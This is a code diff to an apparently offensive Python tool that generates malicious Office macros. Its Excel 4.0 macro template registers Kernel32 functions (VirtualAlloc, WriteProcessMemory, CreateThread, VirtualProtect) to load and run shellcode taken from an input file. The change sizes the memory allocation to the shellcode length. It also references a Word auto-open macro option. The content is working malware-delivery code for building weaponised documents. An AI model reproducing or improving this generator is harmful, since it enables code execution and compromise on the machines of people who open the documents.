@@ -1,4 +1,4 @@
-import os, sys, argparse
+import os, sys, argparse, math
 
 rundotxml = """
 Function writeRunDotXML()
@@ -103,7 +103,7 @@ End Sub
 xlm4macro = """
 =IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(R2C1),GOTO(R16C1))
 =REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)
-=Valloc(0,1000000,4096,64)
+=Valloc(0,1000000,%s,64)
 =REGISTER("Kernel32", "WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)
 =SELECT(R1C2:R1000:C2,R1C2)
 =SET.VALUE(R1C3,0)
@@ -115,7 +115,7 @@ xlm4macro = """
 =REGISTER("Kernel32","CreateThread","JJJJJJJ","Cthread",,1,9)
 =Cthread(0,0,R3C1,0,0,0)
 =REGISTER("Kernel32","VirtualProtect","JJJJJ","Vprotect",,1,9)
-=Vprotect(R3C1,4096,4,0)
+=Vprotect(R3C1,%s,4,0)
 =HALT()
 """
 
@@ -182,9 +182,9 @@ if args.type == "word_macro":
     print(word_auto_open)
 
 if args.type == "xlm4_macro":
-    print(xlm4macro)
     with open(args.infile, "rb") as file: data = file.read()
+    n = math.ceil(len(data)/4096) * 4096
+    out = xlm4macro % (n,n)
+    print(out)
     res = format_shellcode_for_xlm4(data)
     print(res)
-
-    
